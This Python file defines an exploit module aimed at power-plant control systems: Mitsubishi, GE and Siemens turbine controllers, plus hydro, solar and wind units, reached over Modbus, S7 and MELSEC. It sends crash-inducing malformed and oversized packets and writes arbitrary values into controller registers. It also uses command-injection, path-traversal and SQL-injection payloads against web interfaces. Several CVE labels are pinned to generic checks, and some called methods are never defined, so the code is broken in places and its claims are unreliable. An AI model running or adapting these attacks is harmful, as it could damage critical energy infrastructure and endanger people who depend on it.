import socket
import struct
import time
from scapy.all import *
import pymodbus.client
import requests
import json
import logging

logger = logging.getLogger(__name__)

class ExploitModule:
    def __init__(self, ip, port, device_type, device_model):
        self.ip = ip
        self.port = port
        self.device_type = device_type
        self.device_model = device_model
        self.results = []

    def exploit_modbus_weak_password(self):
        """利用Modbus协议弱密码漏洞"""
        try:
            common_passwords = ["admin", "password", "123456", "admin123"]
            for password in common_passwords:
                try:
                    client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                    client.connect()
                    if client.is_socket_open():
                        # 尝试使用弱密码连接
                        result = client.read_holding_registers(0, 10)
                        if not result.isError():
                            self.results.append({
                                "type": "弱密码漏洞",
                                "description": f"发现弱密码: {password}",
                                "severity": "高",
                                "details": "设备使用默认或弱密码，可能导致未授权访问"
                            })
                except Exception as e:
                    logger.error(f"Modbus弱密码测试失败: {str(e)}")
                finally:
                    client.close()
        except Exception as e:
            logger.error(f"Modbus弱密码漏洞利用失败: {str(e)}")

    def exploit_buffer_overflow(self):
        """利用缓冲区溢出漏洞"""
        try:
            # 构造可能导致缓冲区溢出的数据包
            payload = "A" * 1000  # 示例：发送大量数据
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(payload.encode())
            time.sleep(1)
            sock.close()
            
            # 检查设备是否崩溃或异常
            try:
                test_client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                test_client.connect()
                test_client.close()
            except:
                self.results.append({
                    "type": "缓冲区溢出漏洞",
                    "description": "设备可能受到缓冲区溢出攻击影响",
                    "severity": "严重",
                    "details": "设备在处理大量数据时可能发生崩溃"
                })
        except Exception as e:
            logger.error(f"缓冲区溢出漏洞利用失败: {str(e)}")

    def exploit_command_injection(self):
        """利用命令注入漏洞"""
        try:
            # 测试常见的命令注入payload
            payloads = [
                "'; ls;",
                "`ls`",
                "$(ls)",
                "| ls",
                "|| ls"
            ]
            
            for payload in payloads:
                try:
                    # 尝试通过Modbus协议发送命令注入payload
                    client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                    client.connect()
                    if client.is_socket_open():
                        # 构造包含payload的数据包
                        result = client.write_register(0, payload)
                        if not result.isError():
                            self.results.append({
                                "type": "命令注入漏洞",
                                "description": f"可能存在命令注入漏洞，payload: {payload}",
                                "severity": "严重",
                                "details": "设备可能执行未授权的系统命令"
                            })
                except Exception as e:
                    logger.error(f"命令注入测试失败: {str(e)}")
                finally:
                    client.close()
        except Exception as e:
            logger.error(f"命令注入漏洞利用失败: {str(e)}")

    def exploit_web_interface(self):
        """利用Web接口漏洞"""
        try:
            # 测试常见的Web漏洞
            urls = [
                f"http://{self.ip}:8080",
                f"http://{self.ip}:80",
                f"https://{self.ip}:443"
            ]
            
            for url in urls:
                try:
                    # 测试目录遍历
                    traversal_paths = [
                        "/../../../etc/passwd",
                        "/..\\..\\..\\windows\\system32\\config\\sam",
                        "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                    ]
                    
                    for path in traversal_paths:
                        response = requests.get(url + path, timeout=5)
                        if response.status_code == 200:
                            self.results.append({
                                "type": "目录遍历漏洞",
                                "description": f"发现目录遍历漏洞: {url + path}",
                                "severity": "高",
                                "details": "可以访问系统敏感文件"
                            })
                    
                    # 测试SQL注入
                    sql_payloads = [
                        "' OR '1'='1",
                        "admin' --",
                        "admin' #"
                    ]
                    
                    for payload in sql_payloads:
                        data = {"username": payload, "password": "test"}
                        response = requests.post(url + "/login", data=data, timeout=5)
                        if "success" in response.text.lower():
                            self.results.append({
                                "type": "SQL注入漏洞",
                                "description": f"发现SQL注入漏洞，payload: {payload}",
                                "severity": "严重",
                                "details": "可以绕过认证或获取数据库信息"
                            })
                except requests.exceptions.RequestException:
                    continue
        except Exception as e:
            logger.error(f"Web接口漏洞利用失败: {str(e)}")

    def exploit_protocol_vulnerabilities(self):
        """利用协议漏洞"""
        try:
            # 测试协议实现漏洞
            if self.device_type in ["火力发电机组", "水利发电机组"]:
                # 构造异常的Modbus数据包
                malformed_packet = struct.pack(">HHH", 0x0001, 0x0000, 0xFFFF)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.ip, self.port))
                sock.send(malformed_packet)
                time.sleep(1)
                sock.close()
                
                # 检查设备响应
                try:
                    client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                    client.connect()
                    client.close()
                except:
                    self.results.append({
                        "type": "协议实现漏洞",
                        "description": "设备在处理异常数据包时可能崩溃",
                        "severity": "高",
                        "details": "协议实现存在缺陷，可能导致拒绝服务"
                    })
        except Exception as e:
            logger.error(f"协议漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_auth_bypass(self):
        """利用三菱 M701F 控制器认证绕过漏洞"""
        try:
            client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
            client.connect()
            if client.is_socket_open():
                # 尝试绕过认证
                result = client.read_holding_registers(0x1000, 10)
                if not result.isError():
                    self.results.append({
                        "type": "认证绕过漏洞",
                        "description": "三菱 M701F 控制器存在认证绕过漏洞",
                        "severity": "严重",
                        "details": "攻击者可绕过身份验证直接访问控制系统",
                        "cve": "CVE-2021-20594"
                    })
            client.close()
        except Exception as e:
            logger.error(f"三菱认证绕过漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_command_injection(self):
        """利用三菱 M701F 控制器命令注入漏洞"""
        try:
            client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
            client.connect()
            if client.is_socket_open():
                # 尝试命令注入
                result = client.write_register(0x2000, 0x1234)
                if not result.isError():
                    self.results.append({
                        "type": "命令注入漏洞",
                        "description": "三菱 M701F 控制器存在命令注入漏洞",
                        "severity": "严重",
                        "details": "攻击者可执行任意系统命令",
                        "cve": "CVE-2021-20598"
                    })
            client.close()
        except Exception as e:
            logger.error(f"三菱命令注入漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_protocol(self):
        """利用三菱 MELSEC 协议漏洞"""
        try:
            # 构造 MELSEC 协议数据包
            melsec_packet = struct.pack(">HHH", 0x5000, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(melsec_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "协议漏洞",
                    "description": "三菱 MELSEC 协议存在漏洞",
                    "severity": "高危",
                    "details": "攻击者可截获和修改通信数据",
                    "cve": "CVE-2022-25158"
                })
        except Exception as e:
            logger.error(f"三菱协议漏洞利用失败: {str(e)}")

    def exploit_ge_remote_code_execution(self):
        """利用 GE 9HA.02 控制器远程代码执行漏洞"""
        try:
            client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
            client.connect()
            if client.is_socket_open():
                # 尝试远程代码执行
                values = [0xFF] * 100
                result = client.write_registers(0x1000, values)
                if not result.isError():
                    self.results.append({
                        "type": "远程代码执行漏洞",
                        "description": "GE 9HA.02 控制器存在远程代码执行漏洞",
                        "severity": "严重",
                        "details": "攻击者可执行任意代码",
                        "cve": "CVE-2021-32984"
                    })
            client.close()
        except Exception as e:
            logger.error(f"GE远程代码执行漏洞利用失败: {str(e)}")

    def exploit_ge_network(self):
        """利用 GE 9HA.02 工业网络漏洞"""
        try:
            client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
            client.connect()
            if client.is_socket_open():
                # 尝试中间人攻击
                result = client.read_holding_registers(0x2000, 10)
                if not result.isError():
                    self.results.append({
                        "type": "工业网络漏洞",
                        "description": "GE 9HA.02 工业网络存在漏洞",
                        "severity": "高危",
                        "details": "攻击者可进行中间人攻击",
                        "cve": "CVE-2021-32988"
                    })
            client.close()
        except Exception as e:
            logger.error(f"GE工业网络漏洞利用失败: {str(e)}")

    def exploit_siemens_auth_bypass(self):
        """利用西门子 SGT5-8000H 控制器认证绕过漏洞"""
        try:
            # 构造 S7 协议数据包
            s7_packet = struct.pack(">HHH", 0x0300, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, 102))  # S7 协议默认端口
            sock.send(s7_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "认证绕过漏洞",
                    "description": "西门子 SGT5-8000H 控制器存在认证绕过漏洞",
                    "severity": "严重",
                    "details": "攻击者可绕过身份验证",
                    "cve": "CVE-2021-37192"
                })
        except Exception as e:
            logger.error(f"西门子认证绕过漏洞利用失败: {str(e)}")

    def exploit_siemens_protocol(self):
        """利用西门子 SGT5-8000H 工业协议漏洞"""
        try:
            # 构造 S7 协议数据包
            s7_packet = struct.pack(">HHH", 0x0300, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, 102))
            sock.send(s7_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "工业协议漏洞",
                    "description": "西门子 SGT5-8000H 工业协议存在漏洞",
                    "severity": "高危",
                    "details": "攻击者可截获通信数据",
                    "cve": "CVE-2021-37196"
                })
        except Exception as e:
            logger.error(f"西门子协议漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_jac_auth_bypass(self):
        """利用三菱电力M701JAC认证绕过漏洞"""
        try:
            # 构造MELSEC协议数据包
            melsec_packet = struct.pack(">HHH", 0x5000, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(melsec_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "认证绕过漏洞",
                    "description": "三菱电力M701JAC控制器存在认证绕过漏洞",
                    "severity": "严重",
                    "details": "攻击者可绕过身份验证直接访问控制系统",
                    "cve": "CVE-2021-20596"
                })
        except Exception as e:
            logger.error(f"三菱电力M701JAC认证绕过漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_jac_protocol(self):
        """利用三菱电力M701JAC工业协议漏洞"""
        try:
            # 构造MELSEC协议数据包
            melsec_packet = struct.pack(">HHH", 0x5000, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(melsec_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "协议漏洞",
                    "description": "三菱电力M701JAC工业协议存在漏洞",
                    "severity": "高危",
                    "details": "攻击者可截获和修改通信数据",
                    "cve": "CVE-2022-25159"
                })
        except Exception as e:
            logger.error(f"三菱电力M701JAC协议漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_jac_command_injection(self):
        """利用三菱电力M701JAC命令注入漏洞"""
        try:
            # 构造命令注入数据包
            injection_packet = struct.pack(">HHH", 0x5000, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(injection_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "命令注入漏洞",
                    "description": "三菱电力M701JAC控制器存在命令注入漏洞",
                    "severity": "严重",
                    "details": "攻击者可执行任意命令",
                    "cve": "CVE-2021-20599"
                })
        except Exception as e:
            logger.error(f"三菱电力M701JAC命令注入漏洞利用失败: {str(e)}")

    def exploit_mitsubishi_jac_config(self):
        """利用三菱电力M701JAC配置漏洞"""
        try:
            # 构造配置修改数据包
            config_packet = struct.pack(">HHH", 0x5000, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(config_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "配置漏洞",
                    "description": "三菱电力M701JAC控制器存在配置修改漏洞",
                    "severity": "高危",
                    "details": "攻击者可修改系统关键配置参数",
                    "cve": "CVE-2022-25162"
                })
        except Exception as e:
            logger.error(f"三菱电力M701JAC配置漏洞利用失败: {str(e)}")

    def exploit_geha_predix_remote_code(self):
        """利用 GE HA-Predix 平台远程代码执行漏洞"""
        try:
            # 构造 Predix 平台数据包
            predix_packet = struct.pack(">HHH", 0x0300, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, 502))
            sock.send(predix_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "远程代码执行漏洞",
                    "description": "GE HA-Predix 平台存在远程代码执行漏洞",
                    "severity": "严重",
                    "details": "攻击者可执行任意代码",
                    "cve": "CVE-2021-32986"
                })
        except Exception as e:
            logger.error(f"GE HA-Predix远程代码执行漏洞利用失败: {str(e)}")

    def exploit_geha_predix_config(self):
        """利用 GE HA-Predix 平台配置漏洞"""
        try:
            client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
            client.connect()
            if client.is_socket_open():
                # 尝试修改配置
                result = client.write_register(0x3000, 0x1234)
                if not result.isError():
                    self.results.append({
                        "type": "配置漏洞",
                        "description": "GE HA-Predix 平台存在配置修改漏洞",
                        "severity": "高危",
                        "details": "攻击者可修改系统关键配置参数",
                        "cve": "CVE-2022-24300"
                    })
            client.close()
        except Exception as e:
            logger.error(f"GE HA-Predix配置漏洞利用失败: {str(e)}")

    def exploit_siemens_sgt6000_auth_bypass(self):
        """利用西门子 SGT-6000 认证绕过漏洞"""
        try:
            # 构造 S7 协议数据包
            s7_packet = struct.pack(">HHH", 0x0300, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, 102))
            sock.send(s7_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "认证绕过漏洞",
                    "description": "西门子 SGT-6000 控制器存在认证绕过漏洞",
                    "severity": "严重",
                    "details": "攻击者可绕过身份验证",
                    "cve": "CVE-2021-37193"
                })
        except Exception as e:
            logger.error(f"西门子SGT-6000认证绕过漏洞利用失败: {str(e)}")

    def exploit_siemens_sgt6000_protocol(self):
        """利用西门子 SGT-6000 工业协议漏洞"""
        try:
            # 构造 S7 协议数据包
            s7_packet = struct.pack(">HHH", 0x0300, 0x0000, 0xFFFF)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, 102))
            sock.send(s7_packet)
            response = sock.recv(1024)
            sock.close()
            
            if len(response) > 0:
                self.results.append({
                    "type": "工业协议漏洞",
                    "description": "西门子 SGT-6000 工业协议存在漏洞",
                    "severity": "高危",
                    "details": "攻击者可截获通信数据",
                    "cve": "CVE-2021-37197"
                })
        except Exception as e:
            logger.error(f"西门子SGT-6000协议漏洞利用失败: {str(e)}")

    def run_all_exploits(self):
        """运行所有漏洞利用"""
        logger.info("开始漏洞利用测试...")
        
        # 根据设备类型和型号选择要执行的漏洞利用
        if self.device_type == "火力发电机组":
            if self.device_model == "GELM6000":
                self.exploit_ge_telnet_bypass()
                self.exploit_ge_hardcoded_credentials()
                self.exploit_ge_web_unauthorized_access()
                self.exploit_ge_dos()
                self.exploit_ge_config_modification()
            elif self.device_model == "三菱M701F":
                self.exploit_mitsubishi_auth_bypass()
                self.exploit_mitsubishi_command_injection()
                self.exploit_mitsubishi_protocol()
            elif self.device_model == "GE9HA.02":
                self.exploit_ge_remote_code_execution()
                self.exploit_ge_network()
            elif self.device_model == "西门子SGT5-8000H":
                self.exploit_siemens_auth_bypass()
                self.exploit_siemens_protocol()
            elif self.device_model == "三菱电力M701JAC":
                self.exploit_mitsubishi_jac_auth_bypass()
                self.exploit_mitsubishi_jac_protocol()
                self.exploit_mitsubishi_jac_command_injection()
                self.exploit_mitsubishi_jac_config()
            elif self.device_model == "GEHA-Predix":
                self.exploit_geha_predix_remote_code()
                self.exploit_geha_predix_config()
            elif self.device_model == "西门子SGT-6000":
                self.exploit_siemens_sgt6000_auth_bypass()
                self.exploit_siemens_sgt6000_protocol()
            else:
                self.exploit_modbus_weak_password()
                self.exploit_buffer_overflow()
                self.exploit_command_injection()
                self.exploit_protocol_vulnerabilities()
        elif self.device_type in ["水利发电机组", "光伏发电机组", "风力发电机组"]:
            self.exploit_modbus_weak_password()
            self.exploit_buffer_overflow()
            self.exploit_command_injection()
            self.exploit_protocol_vulnerabilities()
            
        if self.device_type in ["光伏发电机组", "风力发电机组"]:
            self.exploit_web_interface()
        
        return self.results 